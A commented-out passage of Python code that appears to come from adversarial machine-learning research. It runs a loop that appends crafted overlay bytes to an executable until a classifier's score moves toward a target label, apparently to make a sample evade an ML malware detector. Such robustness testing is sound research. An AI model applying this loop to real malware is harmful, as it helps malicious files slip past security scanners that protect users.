#         if blob:
#             parts.append(blob)
#     return b"".join(parts)
#
# # ----------------- main overlay loop
#
# def overlay_closed_loop():
#     if not USE_OVERLAY_LOOP:
#         return
#
#     src = EXE_IN_PATH
#     dst = EXE_OUT_PATH
#
#     # Baseline on-disk features
#     x_scaled_exe = extract_scaled_from_exe(src, scaler)
#     p_before = predict_prob_from_scaled(x_scaled_exe)
#     print(f"[Overlay] prob_before={p_before:.4f} (target={target})")
#
#     best_prob = p_before
#     best_path = src
#
#     for L in OVERLAY_TRIES:
#         # Re-evaluate gradient and choose *positive* (addition-only) top-K each attempt
#         x_scaled_cur = extract_scaled_from_exe(best_path, scaler)
#         idxs, signs, g = choose_topK_allowed_addition_only(x_scaled_cur, target, K=K_TOP)
#         print(f"[Overlay] try len={L}, idxs={idxs.tolist()}, signs={signs.tolist()}")
#
#         ov = craft_composite_overlay(idxs, signs, total_len=L, grad_vec=g)
#         if not ov:
#             print("[Overlay] composite crafter returned empty; skipping.")
#             continue
#
#         append_overlay(best_path, ov, dst)
#         x_scaled_new = extract_scaled_from_exe(dst, scaler)
#         p_after = predict_prob_from_scaled(x_scaled_new)
#         print(f"[Overlay] → prob={p_after:.4f}")
#
#         improved = (target == 0 and p_after < best_prob) or (target == 1 and p_after > best_prob)
#         if improved:
#             print(f"[Overlay] accepted len={L}")
#             best_prob = p_after
#             best_path = dst
#             src = best_path
#         else:
#             try:
#                 os.remove(dst)
#             except OSError:
#                 pass
#
#     if best_path != EXE_IN_PATH:
#         print(f"[Overlay] Success. Wrote improved sample: {best_path}, prob={best_prob:.4f}")
#     else:
#         print("[Overlay] No improving overlay found.")
#
# # Run the overlay loop if enabled
# overlay_closed_loop()
# # =================================================================================================
